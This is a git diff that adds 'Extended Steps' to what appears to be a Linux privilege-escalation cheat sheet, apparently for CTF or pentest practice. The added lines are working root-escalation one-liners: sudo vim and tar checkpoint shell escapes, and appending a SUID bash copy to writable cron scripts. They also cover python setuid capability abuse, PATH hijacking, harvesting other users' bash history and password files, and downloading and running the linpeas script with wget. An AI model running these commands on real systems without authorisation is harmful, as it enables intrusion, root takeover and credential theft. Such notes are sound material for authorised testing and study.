@@ -132,6 +132,63 @@ id; sudo -l; uname -a; find / -perm -u=s -type f 2>/dev/null; cat /etc/crontab; 
 <img width="853" height="542" alt="Screenshot From 2025-12-06 05-20-44" src="https://github.com/user-attachments/assets/a5b8d2df-1344-40c0-93ca-ca51f959caf8" />
 
 
+#Extended Steps -
+
+Scroll LinPEAS output for the big colored sections (LinPEAS makes this brain-dead easy) -> Look for any line that is bright red or bright green
+
+Sudo -l deep dive
+sudo -l again → check if you can run ANY of these as root:
+vim, nano, less, more, man, find, awk, perl, python, ruby, tar, rsync, zip, gdb, docker, lxd, etc. 
+-> → Go straight to https://gtfobins.github.io → copy the exact one-liner
+Example: sudo vim -c ':!/bin/sh' → root in 5 seconds
+
+
+SUID deep dive
+Copy the full SUID list from LinPEAS or:
+find / -perm -4000 -o -perm -2000 2>/dev/null
+-> → Paste every binary name into https://gtfobins.github.io/+suid
+Common winners: vim, nano, find, tar, rsync, base64, ash, dash
+Example: /usr/bin/tar → tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=sh → root
+
+
+
+Writable files/directories owned by root
+LinPEAS section “Writable Files” or:
+`find / -writable -type f 2>/dev/null -> grep -v proc`
+
+Cron jobs
+LinPEAS “Cron Jobs” section or:
+cat /etc/crontab /etc/cron.*/* 2>/dev/null
+ls -la /var/spool/cron/crontabs/ 
+-> → If a script path is writable → echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh → wait 60 sec → /tmp/bash -p
+
+Capabilities
+LinPEAS “Capabilities” section or:
+getcap -r / 2>/dev/null
+-> → If you see cap_setuid+ep, cap_sys_admin+ep, etc. → instant root
+Example: python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+Docker / LXD / systemd
+`id ->
+grep dockerorid
+
+Interesting files
+LinPEAS “Interesting Files” or manual:
+cat /home/*/.bash_history 2>/dev/null
+find / -name "*.bak" -o -name "*password*" 2>/dev/null
+-> → Reuse passwords, find SSH keys, config files with creds
+
+Path hijacking
+echo $PATH
+If you can write to a directory early in PATH (e.g. /usr/local/bin) and a root cron runs service, backup, etc.
+-> → echo '/bin/sh' > /usr/local/bin/service; chmod +x /usr/local/bin/service; export PATH=/usr/local/bin:$PATH → wait for cron
+
+
+Still nothing? → Run the second enumerator
+wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh -O /tmp/lp2; /tmp/lp2 (sometimes the first download is cached/old)
+-> LinPEAS almost never misses anything twice
+
+
 
 
 
